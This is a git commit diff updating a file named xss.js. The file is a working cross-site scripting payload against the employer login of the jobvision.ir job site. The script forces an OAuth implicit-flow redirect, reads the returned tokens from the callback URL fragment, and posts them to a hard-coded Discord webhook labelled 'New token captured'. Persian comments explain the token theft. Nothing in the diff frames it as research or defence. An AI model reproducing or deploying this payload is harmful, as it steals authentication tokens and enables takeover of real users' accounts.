98346670bba6bbbabd80948b767fd8b1e93d7935
Sairex <79695218+saeidrz@users.noreply.github.com>
2025-08-03 05:14:25 +0330

    Update xss.js

--- public/xss.js
+++ public/xss.js
@@ -1,23 +1,21 @@
 <!-- public/xss.js -->
-(function(){
+(async function(){
   try {
-  if(window.location.pathname === '/') {
-  window.location.href = "https://account.jobvision.ir/connect/authorize/callback?client_id=EmployerClient&redirect_uri=...";
-} {
-      window.location.href = "https://account.jobvision.ir/connect/authorize/callback?client_id=EmployerClient&redirect_uri=https%3A%2F%2Femployer.jobvision.ir%2Fauth-callback&response_type=id_token%20token&scope=openid%20profile%20JobVisionApi%20roles%20offline_access%20IdentityServerApi&nonce=ea0db2812bc7e8dea4abeb07564f8b25abR1JLlcG&state=f9e32978a1e163fe8682d9d5ae768e8f1eXA9439a&role=employer";
-      return; // بعد از ریدایرکت کد ادامه نمی‌یابد
-    }
-
-    // اگر صفحه callback هست (مثلاً شامل /auth-callback)، توکن‌ها رو بفرست به وب‌هوک دیسکورد
-    if(window.location.href.includes('/auth-callback')) {
+    if(window.location.href.includes('/auth-callback')){
       const data = location.hash || '';
       if(data.length > 0){
-        fetch('https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I', {
+        await fetch('https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `New token captured: ${data}` })
-        }).catch(() => {});
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `New token captured: ${data}`
+          })
+        });
       }
+    } else {
+      window.location.href = "https://account.jobvision.ir/connect/authorize/callback?client_id=EmployerClient&redirect_uri=https%3A%2F%2Femployer.jobvision.ir%2Fauth-callback&response_type=id_token%20token&scope=openid%20profile%20JobVisionApi%20roles%20offline_access%20IdentityServerApi&nonce=ea0db2812bc7e8dea4abeb07564f8b25abR1JLlcG&state=f9e32978a1e163fe8682d9ae768e8f1eXA9439a&role=employer";
     }
   } catch(e){}
 })();
